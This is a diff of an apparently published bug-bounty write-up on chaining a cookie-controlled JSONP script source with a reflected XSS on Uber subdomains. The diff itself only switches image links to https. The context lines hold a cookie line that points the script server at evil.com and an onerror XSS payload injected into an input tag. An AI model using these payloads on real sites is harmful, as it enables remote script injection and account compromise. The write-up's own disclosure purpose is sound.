@@ -24,11 +24,11 @@ idrCall: function() {
 },
 ```
 
-<img src="http://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe8cbagsj21d00r0gsw.jpg">
+<img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe8cbagsj21d00r0gsw.jpg">
 
 &nbsp;&nbsp;&nbsp;Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of `this.rfiServer` could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know the essence of JSONP. The next step was searching everything about `rfiServer`.
 
-<img src="http://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqe84lvb3j20tm0f042c.jpg">
+<img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqe84lvb3j20tm0f042c.jpg">
 
 After reading through these lines of code:
 
@@ -52,13 +52,13 @@ What? We need to find a bug to trigger another bug. And why any subdomain of ube
 document.cookie = '_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'
 ```
 
-<img src="http://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe87abluj20yt0u0qel.jpg">
+<img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe87abluj20yt0u0qel.jpg">
 
 ## XSS of .uber.com which is Out of Scope
 
 I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain `<redacted>.uber.com` for demo.
 
-<img src="http://wx4.sinaimg.cn/mw690/9c5c5d93ly1fxqe89pzq4j21dw0fy79z.jpg">
+<img src="https://wx4.sinaimg.cn/mw690/9c5c5d93ly1fxqe89pzq4j21dw0fy79z.jpg">
 
 1. `"` is reflected and not encoded. We can inject any attribution into `input` tag.
 2. `type="text"` is after the injection point. So we can inject `type="image" src="1" onerror="alert(1)"`. Note that when there is two types, the second one will be ignored.
